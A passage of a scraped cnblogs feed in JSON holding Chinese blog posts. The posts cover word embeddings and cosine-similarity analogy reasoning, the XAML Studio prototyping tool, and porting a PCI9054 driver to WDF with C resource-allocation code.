href=\"https://www.bilibili.com/video/BV1FT4y1E74V?buvid=XU762317353676D786954061C192FE625463B&amp;from_spmid=playlist.playlist-detail.0.0&amp;is_story_h5=false&amp;mid=zqernykrmpf7XfIorMR%2FnA%3D%3D&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=ce0bc526-db69-428a-962e-c65ed8c267bc&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1713085655&amp;unique_k=DfBgvFW&amp;up_id=8654113&amp;vd_source=e035e9878d32f414b4354b839a4c31a4\" rel=\"noopener nofollow\" target=\"_blank\">[双语字幕]吴恩达深度学习deeplearning.ai</a></li>\n<li>github课程资料，含课件与笔记:<a href=\"https://github.com/robbertliu/deeplearning.ai-andrewNG\" rel=\"noopener nofollow\" target=\"_blank\">吴恩达深度学习教学资料</a></li>\n<li>课程配套练习（中英）与答案：<a href=\"https://blog.csdn.net/u013733326/article/details/79827273\" rel=\"noopener nofollow\" target=\"_blank\">吴恩达深度学习课后习题与答案</a></li>\n</ol>\n<p>本篇为第五课的第二周内容，<a href=\"https://www.bilibili.com/video/BV1FT4y1E74V?spm_id_from=333.788.videopod.episodes&amp;vd_source=e035e9878d32f414b4354b839a4c31a4&amp;p=163\" rel=\"noopener nofollow\" target=\"_blank\">2.1</a><strong>和</strong><a href=\"https://www.bilibili.com/video/BV1FT4y1E74V?spm_id_from=333.788.videopod.episodes&amp;vd_source=e035e9878d32f414b4354b839a4c31a4&amp;p=165\" rel=\"noopener nofollow\" target=\"_blank\">2.3</a>的内容以及一些基础的补充。</p>\n<hr />\n<p>本周为第五课的第二周内容，与 CV 相对应的，这一课所有内容的中心只有一个：<strong>自然语言处理（Natural Language Processing，NLP）</strong>。<br />\n应用在深度学习里，它是专门用来进行<strong>文本与序列信息建模</strong>的模型和技术，本质上是在全连接网络与统计语言模型基础上的一次“结构化特化”，也是人工智能中<strong>最贴近人类思维表达方式</strong>的重要研究方向之一。<br />\n<strong>这一整节课同样涉及大量需要反复消化的内容，横跨机器学习、概率统计、线性代数以及语言学直觉。</strong><br />\n语言不像图像那样“直观可见”，更多是抽象符号与上下文关系的组合，因此<strong>理解门槛反而更高</strong>。<br />\n因此，我同样会尽量补足必要的背景知识，尽可能用比喻和实例降低理解难度。<br />\n本周的内容关于词嵌入，是一种<strong>相对于独热编码，更能保留语义信息的文本编码方式</strong>。通过词嵌入，模型不再只是“记住”词本身，而是能够<strong>基于语义关系进行泛化</strong>，在一定程度上实现类似“<strong>举一反三</strong>”的效果。词嵌入是 NLP 领域中最重要的基础技术之一。</p>\n<p>本篇的内容关于<strong>词汇表征和类比推理</strong>，是词嵌入中的基础内容。</p>\n<h1 id=\"1词汇表征\">1.词汇表征</h1>\n<p>先用一句话简单概括一下：词汇表征的含义是<strong>将词汇表示为多维特征向量，以便模型对词语进行计算与比较</strong>。<br />\n这也是词嵌入方法所遵循的核心思想之一，下面就来详细展开：</p>\n<h2 id=\"11-独热编码在序列编码中的局限\">1.1 独热编码在序列编码中的局限</h2>\n<p>在<a href=\"https://www.cnblogs.com/Goblinscholar/p/19449622\" target=\"_blank\">上周的引入</a>中，我们就对独热编码在序列编码中的一些局限有所提及，再简单重复一下：独热向量的维度极高、且极度稀疏带来了<strong>极高的存储和计算成本</strong>，这一问题在词典规模越大的任务中便越被凸显。</p>\n<p>但我们知道，这种成本上的问题往往并不是根本问题所在，有时甚至可以忽略，我们关注一门技术好不好，更多的是在乎它的“效益”，也就是对最终性能的提升。<br />\n因此，在序列信息的表示上，独热编码的核心局限并非成本，而是<strong>它限制了文本的语义表示，无法显式建模词语之间的语义关系</strong>。<br />\n这点并不难理解，我们用课程里的例子来说明一下：<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116214001746-2081259111.png\" /><br />\n就像图里所示，换句话来总结：<strong>独热编码将各个词汇“孤立”了，断绝了苹果和橘子、父亲和母亲、男人和女人这样的词汇间的联系。</strong><br />\n显然，这对模型泛化能力的影响是极大的，这也是独热编码在序列表示中的核心问题所在。</p>\n<p>这个问题的解决方法就是使用词汇表征。</p>\n<h2 id=\"12-词汇的特征化表示\">1.2 词汇的特征化表示</h2>\n<p>这点同样很符合我们的语言直觉，<strong>既然我们知道各个词汇间存在共性、存在某些维度上的相似，那就像归纳总结把它们列举出来</strong>，就像这样：<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213945597-2048528454.png\" />以性别特征为例简单解释一下：我们将男性设置为 -1，把女性设置为 1，以此为尺度估量其他词汇在性别维度上的值，就可以发现，国王在该维度上更接近男性，而王后则更接近女性，<strong>在这种示意下，苹果等与性别无关或不以性别为核心特征的词汇在该维度上的值则接近 0 。</strong></p>\n<p><strong>但是，这里要专门强调一点：这些特征不是我们人为手工定义的，我们这里只是以此进行演示。在实际运行中，词汇在各个维度上的值是通过相应的网络学习并输出的，其各个维度上的语义并不具备这样较强的可解释性。</strong><br />\n在之后我们也会详细展开相关内容。</p>\n<p>在这一部分，吴恩达老师还提及了一种算法：<strong>t-SNE 算法</strong>，这种算法是一种把高维向量“摊平”到 2D / 3D 平面上，并尽量保留“局部相似关系”的<strong>可视化</strong>方法，<strong>我们可以以此来可视化各个词汇在向量空间中的大致距离</strong>，就像这样：<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213945275-1056991747.png\" /><br />\n这个算法的原理涉及到很多没提到过的数学概念，详细介绍需要大量篇幅，而且<strong>目前也有了很多理论更优的同类型方法</strong>，因此就不在这里展开了，以后如果有机会再专门介绍这类内容，这里附上原论文链接：<a href=\"https://www.cs.toronto.edu/~hinton/absps/tsnefinal.pdf\" rel=\"noopener nofollow\" target=\"_blank\">Visualizing Data using t‑SNE</a></p>\n<p>最终，通过一个词汇在多个维度上的表示，我们就通过另一种方式实现了对词汇的编码。<br />\n<strong>这种表示方式能够通过向量间的距离度量词汇语义相似性，从而提升模型的理解与泛化能力，同时也避免了独热编码维度过高且表示稀疏的问题。</strong></p>\n<p>假设我们规定使用 300 维的特征向量来编码词汇时，我们便称这个特征向量为<strong>词向量</strong>。<br />\n同时，这样一个个词向量就像是“嵌入”在了这样一个 300 维的向量空间里。所以，当我们将词汇表示为低维连续向量，并将其映射到同一向量空间中进行学习与比较时，这种表示方式就被称为<strong>词嵌入（embedding）</strong>。<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116214042988-1040885688.png\" /></p>\n<p>我们之后就会详细展开实现词嵌入相关的技术和模型。<br />\n下面我们简单展开一下词嵌入实现的另一项应用：<strong>类比推理</strong>。</p>\n<h1 id=\"2-使用词嵌入进行类比推理\">2. 使用词嵌入进行类比推理</h1>\n<p>在我们实现了词嵌入，得到词表中词汇的词向量表示后，我们可以通过一种方式来<strong>观察和验证词嵌入的语义能力</strong>，就是类比推理。<br />\n在 2013年，一篇名为<a href=\"https://aclanthology.org/N13-1090.pdf\" rel=\"noopener nofollow\" target=\"_blank\">Linguistic Regularities in Continuous Space Word Representations</a>的论文就详细展示了词向量能反映语言类比现象的数据分析方法，同时，我们之后要介绍的 Word2Vec 中也展示了词向量可以实现类比推理。<br />\n总之,词嵌入中的类比推理通过向量运算验证和展示词向量的<strong>语义规律性</strong>，既体现了词嵌入空间的线性结构，也能直观反映<strong>模型对语言关系的理解能力</strong>。</p>\n<p>同样用一句话简单概括一下：类比推理就是<strong>通过向量运算发现词汇间语义关系</strong>，比如“国王–男人+女人≈王后”。<br />\n公式表示为：</p>\n<p></p><div class=\"math display\">\\[\\text{vec}_{(king)} - \\text{vec}_{(man)} + \\text{vec}_{(woman)} \\approx \\text{vec}_{(queen)}\n\\]</div><p></p><p>这是因为词嵌入向量空间可以捕捉<strong>语义方向</strong>，而同类关系的向量差几乎平行，因此通过向量运算就可以“举一反三”，我们便可以由此验证词嵌入的语义能力是否合理。<br />\n简单展开一下：<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213946398-372809404.png\" /><br />\n因此，你会发现，这部分计算：</p>\n<p></p><div class=\"math display\">\\[\\text{vec}_{(king)} - \\text{vec}_{(man)} + \\text{vec}_{(woman)} \n\\]</div><p></p><p><strong>实际上，是让‘国王’沿着‘男人→女人’的语义方向平移，以此来得到一个目标向量，如果词嵌入合理，那么这个向量就会指向语义上最接近“王后”的位置。</strong></p>\n<p>到这里，我们就得到了在男人对应女人的维度上，国王所对应的目标向量。<br />\n但是到这里还没有结束，我们还差一步，<strong>那就是找到在语义上距离目标向量最近的词向量，得到类比结果。</strong><br />\n因此，我们下一步的工作就是<strong>将目标向量与词表中所有词向量逐个计算相似度，再选取相似度最高的词作为预测结果。</strong></p>\n<p>如何计算相似度？你可能会想到我们常用的欧氏距离。</p>\n<p></p><div class=\"math display\">\\[d(\\vec{x}, \\vec{y}) = |\\vec{x} - \\vec{y}|  \n= \\sqrt{\\sum_{i=1}^{d} (x_i - y_i)^2}  \n\\]</div><p></p><p>然而，<strong>在词嵌入空间中，直接使用欧氏距离并不是一个理想的选择</strong>。<br />\n这是因为欧氏距离同时受到<strong>向量方向</strong>和<strong>向量长度</strong>的影响，虽然词向量维度相同，但训练目标并不会约束不同词向量的长度一致。由于词频、梯度更新次数和优化路径的差异，不同词向量的范数往往不同，而这些<strong>长度差异并不一定对应语义差异</strong>。<br />\n听起来很复杂，来举个例子看看：<br />\n<img alt=\"image.png\" src=\"https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213946144-1939476227.png\" /></p>\n<p>换句话说，在语义上非常接近的两个词向量，可能只是因为长度不同，在欧氏距离下被判定为“相距较远”，从而干扰类比推理的结果。<br />\n相比之下，我们更关心的是：  <strong>目标向量与某个词向量在语义方向上是否一致。</strong><br />\n这正是<strong>余弦相似度（Cosine Similarity）</strong> 所度量的内容。<br />\n余弦相似度通过计算两个向量夹角的余弦值，来衡量它们在方向上的一致程度，其定义为：<br />\n其定义为：</p>\n<p></p><div class=\"math display\">\\[\\cos(\\theta) = \\frac{\\vec{x} \\cdot \\vec{y}}{|\\vec{x}|  |\\vec{y}|}  \n= \\frac{\\sum_{i=1}^{d} x_i y_i}{\\sqrt{\\sum_{i=1}^{d} x_i^2}  \\sqrt{\\sum_{i=1}^{d} y_i^2}}  \n\\]</div><p></p><p>其中，<span class=\"math inline\">\\(\\vec{x} \\cdot \\vec{y}\\)</span> 表示向量的点积，<span class=\"math inline\">\\(|\\vec{x}|\\)</span> 与 <span class=\"math inline\">\\(|\\vec{y}|\\)</span> 分别表示向量的欧几里得范数（向量各维度平方和的开方）。<br />\n可以看到，<strong>余弦相似度在计算过程中对向量进行了长度归一化</strong>，因此最终的结果只与两个向量之间的夹角有关，而与它们的绝对长度无关。</p>\n<p>从几何角度来看，余弦相似度实际上回答的是这样一个问题： <strong>“这两个向量指向的方向有多一致？”</strong><br />\n当两个向量方向完全一致时，夹角 <span class=\"math inline\">\\(\\theta = 0^\\circ\\)</span>，此时 <span class=\"math inline\">\\(\\cos(\\theta)=1\\)</span>。<br />\n当两个向量正交时，<span class=\"math inline\">\\(\\theta = 90^\\circ\\)</span>，<span class=\"math inline\">\\(\\cos(\\theta)=0\\)</span>。<br />\n而当两个向量方向相反时，<span class=\"math inline\">\\(\\theta = 180^\\circ\\)</span>，<span class=\"math inline\">\\(\\cos(\\theta)=-1\\)</span>。<br />\n这与我们在词嵌入中的直觉是高度一致的：  如果两个词在语义空间中表达的是<strong>相似或相关的含义</strong>，那么它们的向量应当指向相近的方向，而语义无关的词，其向量方向往往接近正交。</p>\n<p>我们仍然用前面的例子再来演示一下：</p>\n<p></p><div class=\"math display\">\\[\\vec{v}_{target} = [1, 3] ， \\vec{v}_{queen} = [10, 30]  \n\\]</div><p></p><p>显然，这两个向量方向完全一致，仅长度不同。<br />\n计算它们的余弦相似度：</p>\n<p></p><div class=\"math display\">\\[\\cos(\\theta) = \\frac{1 \\times 10 + 3 \\times 30}{\\sqrt{1^2 + 3^2} \\cdot \\sqrt{10^2 + 30^2}}  \n= \\frac{100}{\\sqrt{10} \\cdot \\sqrt{1000}} = 1  \n\\]</div><p></p><p>可以看到，尽管两个向量在欧氏距离下“相距很远”，但在余弦相似度的度量下，它们被正确地判定为<strong>语义方向完全一致</strong>。<br />\n因此，在词嵌入的类比推理任务中，我们通常采用<strong>余弦相似度</strong>来衡量目标向量与词表中各个词向量之间的接近程度，从而选取语义上最合理的预测结果。</p>\n<p><strong>我们会在之后的词嵌入模型中再展开为什么有些词向量的长度很大，而长度又代表了什么。</strong><br />\n由此，我们完成了使用词嵌入来进行类比推理的过程，这不仅是词嵌入的一项应用，我们也可以用它来检验词嵌入模型对语义的理解能力。</p>\n<h1 id=\"3-总结\">3. 总结</h1>\n<table>\n<thead>\n<tr>\n<th>概念</th>\n<th>原理</th>\n<th>比喻</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>词汇表征</td>\n<td>将词汇表示为多维连续向量（词向量/embedding），以便模型计算和比较。</td>\n<td>词汇像嵌入在高维空间里的点，距离反映语义相似性。</td>\n</tr>\n<tr>\n<td>独热编码（One-hot）</td>\n<td>每个词用高维稀疏向量表示，向量间互相正交。</td>\n<td>每个词孤立存在，苹果和橘子、男人和女人没有联系。</td>\n</tr>\n<tr>\n<td>词嵌入（Embedding）</td>\n<td>将词向量映射到同一向量空间进行学习和比较，低维、连续、可度量相似性。</td>\n<td>像把高维词汇空间“压缩”成一个连续空间，词语间距离反映语义。</td>\n</tr>\n<tr>\n<td>类比推理</td>\n<td>通过向量运算发现词汇间语义关系，公式：<span class=\"math inline\">\\(\\vec{king}-\\vec{man}+\\vec{woman}\\approx \\vec{queen}\\)</span></td>\n<td>国王沿“男人→女人”的语义方向平移，指向王后。</td>\n</tr>\n<tr>\n<td>相似度计算</td>\n<td>欧氏距离受向量长度影响，可能误判语义；余弦相似度只看向量方向</td>\n<td>方向一致的向量被判定语义相近，即使长度不同。</td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>$$\\cos(\\theta) = \\frac{\\vec{x} \\cdot \\vec{y}}{|\\vec{x}| , |\\vec{y}|}$$</td>\n<td>两个向量方向一致就像箭头指向相同方向，即使箭头长短不同也一样。</td>\n</tr>\n<tr>\n<td>向量长度</td>\n<td>主要受词频、梯度累计等训练因素影响，不直接对应语义。</td>\n<td>长度大不代表更“重要”，方向才决定语义关系。</td>\n</tr>\n<tr>\n<td>可视化（t-SNE）</td>\n<td>将高维词向量映射到2D/3D平面，尽量保留局部相似关系。</td>\n<td>像把高维空间“摊平”，方便观察词语间距离。</td>\n</tr>\n</tbody>\n</table>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 21:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Goblinscholar\">哥布林学者</a>&nbsp;\n阅读(<span id=\"post_view_count\">14</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "一款专为 WinUI XAML 设计的快速原型设计工具，生成的代码可轻松复制到Visual Studio中！",
      "link": "https://www.cnblogs.com/Can-daydayup/p/19494169",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Can-daydayup/p/19494169\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 21:38\">\n    <span>一款专为 WinUI XAML 设计的快速原型设计工具，生成的代码可轻松复制到Visual Studio中！</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h2><span>前言</span></h2>\n<p><span>今天大姚给大家分享一款专为 WinUI XAML 设计的快速原型设计工具，生成的代码可轻松复制到 Visual Studio 中：<strong>XAML Studio</strong><span>。</span></span></p>\n<h2><span>XAML Studio 工具介绍</span></h2>\n<p><span>XAML Studio 是一款专为 WinUI XAML 设计的快速原型设计工具，基于 C# 开源（MIT license），生成的代码可轻松复制到 Visual Studio 中的应用中。XAML Studio 让你实时预览 XAML 代码，并与结果互动，就像它在你自己的应用中运行一样。</span></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213613167-245037706.png\" /></p>\n<h2><span>WinUI 介绍</span></h2>\n<p><span>WinUI 是一个现代 UI 框架，拥有丰富的控件和样式，用于构建动态且高性能的 Windows 应用程序。</span></p>\n<ul class=\"list-paddingleft-1\">\n<li><a href=\"https://github.com/microsoft/microsoft-ui-xaml\" rel=\"noopener nofollow\" target=\"_blank\"><span>https://github.com/microsoft/microsoft-ui-xaml</span></a></li>\n</ul>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213633580-546817572.png\" /></p>\n<h2><span>应用场景</span></h2>\n<ul class=\"list-paddingleft-1\">\n<li><strong>界面调试与优化：</strong><span>&nbsp;通过内置的调试工具和数据上下文编辑器，开发者可以实时调试和优化界面。</span></li>\n<li><strong>学习与教学：</strong><span>&nbsp;对于初学者，XAML Studio 提供了一个低门槛的平台来学习和实践 WinUI XAML 开发。</span></li>\n<li><strong>快速原型设计：</strong><span>&nbsp;开发者可以利用 XAML Studio 快速构建和测试 XAML 界面，无需在 Visual Studio 中完整构建应用程序。</span></li>\n</ul>\n<h2><span>功能特点</span></h2>\n<p><span>实时编辑与交互、绑定调试器、数据上下文编辑器、自动保存并恢复文档、智能感知（IntelliSense）、文档工具箱、对齐辅助线等。</span></p>\n<h2><span>项目源代码</span></h2>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213646854-60919217.png\" /></p>\n<h2><span>运行效果演示</span></h2>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213613167-245037706.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213702498-1564398781.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213708854-2025259760.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213714543-2136022853.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213720682-160742385.png\" /></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260116213726638-346653708.png\" /></p>\n<h2><span>项目源码地址</span></h2>\n<p><span>更多项目实用功能和特性欢迎前往项目开源地址查看👀，别忘了给项目一个Star支持💖。</span></p>\n<ul class=\"list-paddingleft-1\">\n<li><strong>GitHub开源地址：</strong><a href=\"https://github.com/dotnet/XAMLStudio\" rel=\"noopener nofollow\" target=\"_blank\"><span>https://github.com/dotnet/XAMLStudio</span></a></li>\n</ul>\n<h2><span>优秀项目和框架精选</span></h2>\n<p><span>该项目已收录到C#/.NET/.NET Core优秀项目和框架精选中，关注优秀项目和框架精选能让你及时了解C#、.NET和.NET Core领域的最新动态和最佳实践，提高开发工作效率和质量。坑已挖，欢迎大家踊跃提交PR推荐或自荐（<strong>让优秀的项目和框架不被埋没🤞</strong><span>）。</span></span></p>\n<ul class=\"list-paddingleft-1\">\n<li><strong>GitHub开源地址：</strong><a href=\"https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md\" rel=\"noopener nofollow\" target=\"_blank\"><span>https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md</span></a></li>\n<li><strong>Gitee开源地址：</strong><a href=\"https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md\" rel=\"noopener nofollow\" target=\"_blank\"><span>https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md</span></a></li>\n</ul>\n<div id=\"gtx-trans\">&nbsp;</div>\n</div>\n<div id=\"MySignature\">\n    <blockquote>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\"><span style=\"font-size: 17px;\">作者名称：</span><a href=\"https://www.cnblogs.com/Can-daydayup/\" target=\"_blank\">追逐时光者</a></p>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\"><span style=\"font-size: 17px;\">作者简介：</span>一个热爱编程、善于分享、喜欢学习、探索、尝试新事物和新技术的全栈软件工程师。</p>\n<p style=\"font-family: YouYuan; font-size: 16px; margin: 0 auto 0.01em auto;\">\n本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接，否则保留追究法律责任的权利。如果该篇文章对您有帮助的话，可以点一下右下角的<a href=\"\" style=\"color: red;\">【♥推荐♥】</a>，希望能够持续的为大家带来好的技术文章，文中可能存在描述不正确的地方，欢迎指正或补充，不胜感激。\n</p>\n</blockquote>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 21:38</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Can-daydayup\">追逐时光者</a>&nbsp;\n阅读(<span id=\"post_view_count\">32</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PCI9x5x驱动移植支持PCI9054在win7下使用1",
      "link": "https://www.cnblogs.com/haohaoganhuo/p/19493093",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/haohaoganhuo/p/19493093\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 17:06\">\n    <span>PCI9x5x驱动移植支持PCI9054在win7下使用1</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>本驱动最终目的是为了将北京中泰联创科技有限公司的一个数据采集卡老产品驱动升级成WDF框架的新驱动，老驱动使用Driver Studio开发，在64位操作系统下不够稳定，所以要升级成WDF框架。后续用老产品称呼实际硬件，老驱动称呼Driver Studio开发的驱动，新驱动称呼WDF框架驱动。</p>\n<p>开始的时候想使用Qoder直接分析老驱动后自动生成一个WDF框架驱动，结果没有成功，看来它并不是万能，编程过程中直接让他帮忙给些提示还是可以的，大家想要尝试Qoder可以在官网下载，也可以通过下面链接注册下载：<br />\n<a href=\"https://qoder.com/referral?referral_code=T0BDuCGlZU9RQTm4FyaG5cVIGi8wWaFX\" rel=\"noopener nofollow\" target=\"_blank\">Qoder下载链接</a></p>\n<h2 id=\"修改示例程序支持windows7\">修改示例程序支持Windows7</h2>\n<p>在“属性-Driver Settings-Target OS version”设置成windows7后，编译报告不支持1.19错误，改成1.11才能支持</p>\n<p>但是1.11下不支持WdfDmaTransactionSetSingleTransferRequirement函数，注释掉后才能正常编译，这个函数用于确定DMA是否需要单次传输完所有数据，在本驱动中，可以通过同步IO来解决这个问题，后面再说</p>\n<h2 id=\"在目标机器上搭建调试环境\">在目标机器上搭建调试环境</h2>\n<p>首先在windows11上配置，后续再使用windows7。</p>\n<h3 id=\"支持实验签名\">支持实验签名</h3>\n<p>64位系统必须得有数字签名才能够安装驱动，VS2017+WDK的编译环境可以自动加测试签名，所以只要将目标机开启TestSigning即可，这部分可以自行百度，或者直接使用签名工具“Windows 64Signer V1.2.exe”，它除了给驱动签名，还能开启TestSigning。</p>\n<h3 id=\"支持内核信息输出\">支持内核信息输出</h3>\n<p>debugview是可以显示内核信息的，但是示例驱动中使用WPP（Windows Software Trace Preprocessor）方式跟踪代码流程，需要进行一定的转换才能显示在debugview中，所以暂时先不使用debugview显示。</p>\n<p>在Windows11下比较简单就可以使用工具显示WPP的输出信息，直接将WDK安装目录的可执行文件夹复制到目标机器即可，我的目录是：<br />\nC:\\Program Files (x86)\\Windows Kits\\10\\Tools\\x64<br />\n将x64目录整个复制到目标机，然后以管理员身份运行运行traceview.exe<br />\n初次运行需要File-\"Create New Log Session\"-\"PDB（Debug Information） File\"<br />\n选择编译目录的Pci9x5x.pdb</p>\n<p>然后就能看到在驱动中输出的信息了。</p>\n<h2 id=\"寄存器定义\">寄存器定义</h2>\n<p>PCI9656与PCI9054在基地址、中断以及DMA操作方面的定义完全一样，只有其它一些没用到的功能定义不同，所以稍加改动就可以使用示例程序中的寄存器头文件。</p>\n<h2 id=\"分配资源\">分配资源</h2>\n<p>PLxPrepareHardware函数中分配资源<br />\n对于PCI总线，驱动使用BAR这个概念来分配寄存器资源，BAR是\"Base Address Register\"的缩写，也就是基地址寄存器，32位PCI总线最多6个BAR，根据找到顺序的不同，从BAR0~BAR5。</p>\n<h3 id=\"老驱动中9054分配资源操作\">老驱动中9054分配资源操作：</h3>\n<p>按照资源序号：</p>\n<ul>\n<li>BAR3对应本地译码地址，读写操作FPGA\n<ul>\n<li>应用层读写IO使用</li>\n</ul>\n</li>\n<li>BAR2对应本地译码地址，读写操作FPGA\n<ul>\n<li>内核操作使用</li>\n</ul>\n</li>\n<li>BAR1对应PCI9054地址，读写操作9054</li>\n</ul>\n<p>不知道为何老驱动使用了两个BAR来操作相同的本地总线，新驱动应该使用一个即可。</p>\n<h3 id=\"新驱动中资源分配操作\">新驱动中资源分配操作：</h3>\n<p>下面是PCI9656开发板的资源分配：</p>\n<ul>\n<li>找到内存方式且长度对应0x200，则对应BAR0，地址映射给Regs，直接使用结构体内成员来操作寄存器。</li>\n<li>找到IO方式且长度大于或者等于0x100，则对应BAR1，后续并没有处理这个资源。</li>\n<li>第一次找到内存方式且长度对应0x20000，则对应BAR2，后面映射地址给SRAMBase，但是也没有用到这个地址。</li>\n<li>第二次找到内存方式且长度对应0x20000，则对应BAR3，实际上后面没有处理这个资源</li>\n</ul>\n<p>对于老产品，总的资源数量有9个，分配情况如下</p>\n<ul>\n<li>0 内存资源，长度=256（BAR0）</li>\n<li>1 129号资源，设备私有资源，应该用不到</li>\n<li>2 IO资源，长度256，PCI9054地址（BAR1）</li>\n<li>3 129号资源，设备私有资源，应该用不到</li>\n<li>4 内存资源，长度131,072（0x20000），这个应该是最早9054开发板的资源分配信息，老产品保留了这个设置，实际应该对应本地地址，操作FPGA。（BAR2）</li>\n<li>5 129号资源，设备私有资源，应该用不到</li>\n<li>6 IO资源，长度256，本地地址，操作FPGA（BAR3）</li>\n<li>7 129号资源，设备私有资源，应该用不到</li>\n<li>8 中断资源，这个以后再处理。<br />\n之前无法确定哪个资源对应本地IO，因此需要测试52地址是否能返回0x3100来判断，如果返回0x3100则说明是本地IO<br />\n经过测试后，6号资源（BAR2）对应本地寄存器，2号资源（BAR1）对应PCI9054寄存器。他们都是IO资源，可以直接使用READ_PORT_ULONG和WRITE_PORT_ULONG进行读写操作。内存资源需要使用“LocalMmMapIoSpace”函数转换后，才能使用WRITE_REGISTER_ULONG和READ_REGISTER_ULONG操作。个人感觉IO资源操作更方便，所以所有寄存器操作均使用IO资源。</li>\n</ul>\n<p>仿照示例驱动，先找到的IO资源是PCI9054地址，后找到的IO资源是本地资源。修改后的代码如下：</p>\n<pre><code class=\"language-c\">case CmResourceTypePort:\n//分配IO资源\n  bar = NULL;\n\n  if (!foundLocalPort &amp;&amp; !found9054Port &amp;&amp;\n      desc-&gt;u.Port.Length == 0x100) {\n        found9054Port = TRUE;\n        bar = \"BAR1-9054\";\n        DevExt-&gt;Regs = (PPCI9656_REGS)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;RegsLength = regsLength;\n      }\n      else if (!foundLocalPort &amp;&amp; \n                desc-&gt;u.Port.Length == 0x100) {\n        foundLocalPort = TRUE;\n        bar = \"BAR3-FPGA\";\n        DevExt-&gt;addrLocal = (PUCHAR)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;localLength = desc-&gt;u.Port.Length;\n      }\n\n      TraceEvents(TRACE_LEVEL_INFORMATION, DBG_PNP,\n                  \" - Port   Resource [%08I64X-%08I64X], %s, i:%d length:%d\",\n                    desc-&gt;u.Port.Start.QuadPart,\n                    desc-&gt;u.Port.Start.QuadPart +\n                    desc-&gt;u.Port.Length,\n                    (bar) ? bar : \"&lt;unrecognized&gt;\",\n                    i,\n                    desc-&gt;u.Port.Length);\nbreak;\n</code></pre>\n<p>至此，资源分配部分代码完成，后续要修改其它具体操作。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 17:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/haohaoganhuo\">自由的好好干活</a>&nbsp;\n阅读(<span id=\"post_view_count\">54</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "深入理解飞书 Webhook 签名验证：一次踩坑到填坑的完整记录",
      "link": "https://www.cnblogs.com/mudtools/p/19492945",
      "published": "",
